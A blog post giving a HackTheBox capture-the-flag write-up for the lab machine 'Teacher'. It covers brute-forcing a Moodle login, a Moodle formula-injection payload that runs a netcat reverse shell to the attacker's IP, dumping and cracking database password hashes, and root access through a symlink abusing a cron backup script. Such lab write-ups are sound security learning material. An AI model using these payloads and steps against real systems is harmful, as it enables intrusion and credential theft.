---
layout: post
title: Hackthebox Teacher Writeup
categories: HackTheBox
---

<img src="/public/images/2019-04-26/teacher_badge.png"><br>
## Explanation
<a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has bunch of vulnerable machines in its own VPN.
This is a write-up of machine "Teacher" on that website.

## Solution
### 1. Initial Enumeration
Port Scanning:
{% highlight shell %}
root@kali:/home/sabonawa/hackTB/work# nmap -p- 10.10.10.153 -sV -sC
Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-15 23:12 EET
Nmap scan report for 10.10.10.153
Host is up (0.035s latency).
Not shown: 65534 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Blackhat highschool

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.90 seconds
{% endhighlight %}

Gobuster HTTP:
{% highlight shell %}
root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,403' -u http://10.10.10.153
 
=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.153/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,403
[+] Timeout      : 10s
=====================================================
2019/02/16 09:41:51 Starting gobuster
=====================================================
/images (Status: 301)
/css (Status: 301)
/manual (Status: 301)
/js (Status: 301)
/javascript (Status: 301)
/fonts (Status: 301)
/phpmyadmin (Status: 403)
/moodle (Status: 301)
/server-status (Status: 403)
=====================================================
2019/02/16 09:56:06 Finished
=====================================================
{% endhighlight %}

Gobuster HTTP "/moodle":
{% highlight shell %}
root@kali:~# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s '200,204,301,302,403' -u http://10.10.10.153/moodle/

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.153/moodle/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,403
[+] Timeout      : 10s
=====================================================
2019/02/26 17:29:39 Starting gobuster
=====================================================
/search (Status: 301)
/blog (Status: 301)
/rss (Status: 301)
/login (Status: 301)
/media (Status: 301)
/files (Status: 301)
/user (Status: 301)
/calendar (Status: 301)
/admin (Status: 301)
/comment (Status: 301)
/report (Status: 301)
/local (Status: 301)
/pix (Status: 301)
/tag (Status: 301)
/group (Status: 301)
/my (Status: 301)
/install (Status: 301)
/lib (Status: 301)
/portfolio (Status: 301)
/cache (Status: 301)
/notes (Status: 301)
/message (Status: 301)
/lang (Status: 301)
/theme (Status: 301)
/blocks (Status: 301)
/question (Status: 301)
/backup (Status: 301)
/rating (Status: 301)
/filter (Status: 301)
/mod (Status: 301)
/auth (Status: 301)
/course (Status: 301)
/error (Status: 301)
/badges (Status: 301)
/repository (Status: 301)
/analytics (Status: 301)
/availability (Status: 301)
/webservice (Status: 301)
/plagiarism (Status: 301)
/competency (Status: 301)
=====================================================
2019/02/26 17:44:31 Finished
=====================================================
{% endhighlight %}


### 2. Getting User
As we can see, <a href="https://moodle.org/">Moodule</a> is running on this server.
![placeholder](https://inar1.github.io/public/images/2019-04-26/2019-04-26-12-31-33.png)
We can login the moodle as guest user but there is not any interesting information.<br>
By enumerating some other pages, we can find that there is a strange image file on "/gallery.html"
What we can find is that
1. There is a image tag its source file is exist but we can not see
2. This tag shows unknown message which says "That's an F"
![placeholder](https://inar1.github.io/public/images/2019-04-26/2019-04-26-12-40-15.png)
![placeholder](https://inar1.github.io/public/images/2019-04-26/2019-04-26-12-40-42.png)

By executing curl command, we can figure out what is the content of 5.png
{% highlight shell %}
root@kali:~# curl http://10.10.10.153/images/5.png
Hi Servicedesk,

I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.

Could you guys figure out what the last charachter is, or just reset it?

Thanks,
Giovanni
{% endhighlight %}

According to this information, the username we can expect is "Giovanni".<br>
And its password consists of "Th4C00lTheacha" + one character.<br>
<br>
We can take advantage of this information for login to moodle admin console.<br>
At first, we have to create a possible password lists.
{% highlight python %}
#! /usr/bin/python3

import string

PASS = "Th4C00lTheacha"

chars = ""
chars += string.ascii_letters
chars += string.digits
chars += string.punctuation

with open("./password.txt", "w") as f:
    txt = ""
    for c in chars:
        txt += PASS + c + '\n'
    f.write(txt)
    f.close()
{% endhighlight %}

By running a script above, we have possible passwords.<br>
Then, try to execute dictionary attack.<br>
We can use "wfuzz" for this purpose.
{% highlight shell %}
root@kali:~# wfuzz -w ./password.txt --hh 440 -t 20 -d "anchor=&username=giovanni&password=FUZZ" http://10.10.10.153/moodle/login/index.php

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.153/moodle/login/index.php
Total requests: 94

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000065:  C=303      6 L	      34 W	    454 Ch	  "Th4C00lTheacha#"

Total time: 11.37637
Processed Requests: 94
Filtered Requests: 93
Requests/sec.: 8.262736
{% endhighlight %}

This means we got this credential for moodle.
{% highlight shell %}
giovanni:Th4C00lTheacha#
{% endhighlight %}
![placeholder](https://inar1.github.io/public/images/2019-04-26/2019-04-26-14-54-27.png)

Then click on Algebra, setting button, and "More..."
![placeholder](https://inar1.github.io/public/images/2019-04-26/2019-04-26-14-57-44.png)

Click "questions" and "create a new question".<br>
![placeholder](https://inar1.github.io/public/images/2019-04-26/2019-04-26-15-01-09.png)

Then, click "Caluculated" and "add".<br>
Put following values, save the change and click "next page".
{% highlight shell %}
Question name: baa
Question test: foo
fomula: /*{a*/`$_GET[0]`;//{x}}
Grade: 100%
{% endhighlight %}
![placeholder](https://inar1.github.io/public/images/2019-04-26/2019-04-26-18-07-08.png)

By sending following request with web browser, we can achieve a reverse shell.
{% highlight shell %}
# current page url + &0=(date;nc -e /bin/bash 10.10.14.23 443) 
http://10.10.10.153/moodle/question/question.php?returnurl=%2Fquestion%2Fedit.php%3Fcourseid%3D2&appendqnumstring&scrollpos=0&id=7&wizardnow=datasetitems&courseid=2&0=(date;nc%20-e%20/bin/bash%2010.10.14.23%20443)
{% endhighlight %}
{% highlight shell %}
root@kali:~# nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.153] 48136
ls
addquestion.php
behaviour
category.php
category_class.php
category_form.php

~~~

{% endhighlight %}

Then, spawn a full tty shell.
{% highlight shell %}
root@kali:~# nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.23] from (UNKNOWN) [10.10.10.153] 48144
python -c 'import pty;pty.spawn("/bin/bash")'
www-data@teacher:/var/www/html/moodle/question$ 
{% endhighlight %}

By enumeration on Teacher as www-data user, we can find a credential for mariadb in "/var/www/html/moodle/config.php".
{% highlight shell %}
www-data@teacher:/var/www/html/moodle$ cat config.php
cat config.php
<?php  // Moodle configuration file

unset($CFG);
global $CFG;
$CFG = new stdClass();

$CFG->dbtype    = 'mariadb';
$CFG->dblibrary = 'native';
$CFG->dbhost    = 'localhost';
$CFG->dbname    = 'moodle';
$CFG->dbuser    = 'root';
$CFG->dbpass    = 'Welkom1!';
$CFG->prefix    = 'mdl_';

~~~

{% endhighlight%}

In DB "moodle" of Mariadb, we can find some password hashes for each user.<br>
One is outstanding.
{% highlight shell %}
MariaDB [moodle]> select username, password FROM mdl_user;
select username, password FROM mdl_user;
+-------------+--------------------------------------------------------------+
| username    | password                                                     |
+-------------+--------------------------------------------------------------+
| guest       | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO |
| admin       | $2y$10$7VPsdU9/9y2J4Mynlt6vM.a4coqHRXsNTOq/1aA6wCWTsF2wtrDO2 |
| giovanni    | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf/M1Zkj/i1VqLO0FSYO |
| Giovannibak | 7a860966115182402ed06375cf0a22af                             |
+-------------+--------------------------------------------------------------+
4 rows in set (0.00 sec)
{% endhighlight %}

By hash-identifier, we can figure out this is MD5.
{% highlight shell %}
root@kali:~# hash-identifier 
   #########################################################################
   #	 __  __ 		    __		 ______    _____	   #
   #	/\ \/\ \		   /\ \ 	/\__  _\  /\  _ `\	   #
   #	\ \ \_\ \     __      ____ \ \ \___	\/_/\ \/  \ \ \/\ \	   #
   #	 \ \  _  \  /'__`\   / ,__\ \ \  _ `\	   \ \ \   \ \ \ \ \	   #
   #	  \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \	    \_\ \__ \ \ \_\ \	   #
   #	   \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/	   #
   #	    \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.1 #
   #								 By Zion3R #
   #							www.Blackploit.com #
   #						       Root@Blackploit.com #
   #########################################################################

   -------------------------------------------------------------------------
 HASH: 7a860966115182402ed06375cf0a22af

Possible Hashs:
[+]  MD5
[+]  Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))

~~~

{% endhighlight %}

Clack this hash with John the Ripper. The password is "expelled".
{% highlight shell %}

{% endhighlight %}

We can use this credential "giovanni:expelled" for su command<br>
As usuall, user.txt is in a home directory.
{% highlight shell %}
www-data@teacher:/var/www/html/moodle$ su giovanni
su giovanni
Password: expelled

giovanni@teacher:/var/www/html/moodle$ cd
cd
giovanni@teacher:~$ cat user.txt
cat user.txt
fa9ae187462530e841d9e61936648fa7
{% endhighlight %}

### 3. Getting Root
if we execute following command, we can assume automatic process is running and giving some modification for this directory by its date.
{% highlight shell %}
giovanni@teacher:~/work$ ls -la
ls -la
total 16
drwxr-xr-x 4 giovanni giovanni 4096 Apr 26 21:28 .
drwxr-x--- 4 giovanni giovanni 4096 Nov  4 19:47 ..
drwxrwxrwx 3 giovanni giovanni 4096 Apr 26 21:28 courses
drwxrwxrwx 3 giovanni giovanni 4096 Jun 27  2018 tmp
{% endhighlight %}

At the same time, we can find an interesting binary in "/usr/bin".
{% highlight shell %}
giovanni@teacher:/usr/bin$ cat backup.sh
cat backup.sh
#!/bin/bash
cd /home/giovanni/work;
tar -czvf tmp/backup_courses.tar.gz courses/*;
cd tmp;
tar -xf backup_courses.tar.gz;
chmod 777 * -R;
{% endhighlight %}

This script is doing 
1. backup of directory ~/work/courses
2. extract these files in ~/work/tmp
3. giving permission 777 for extracted files.

Then, create a symbolic link to /root in ~/work/tmp/
{% highlight shell %}
giovanni@teacher:~/work/courses$ ln -s /root/ root
ln -s /root/ root

giovanni@teacher:~/work/tmp/courses$ ls -la
ls -la
total 12
drwxrwxrwx 3 root     root     4096 Apr 26 21:42 .
drwxrwxrwx 3 giovanni giovanni 4096 Apr 26 21:38 ..
drwxrwxrwx 2 root     root     4096 Jun 27  2018 algebra
lrwxrwxrwx 1 giovanni giovanni    6 Apr 26 21:28 root -> /root/
{% endhighlight %}

We have to wait for the cron job.<br>
After that, we can achieve the root.txt from the symbolic link.
{% highlight shell %}
giovanni@teacher:~/work/tmp$ cat root/root.txt
cat root/root.txt
4f3a83b42ac7723a508b8ace7b8b1209
{% endhighlight %}
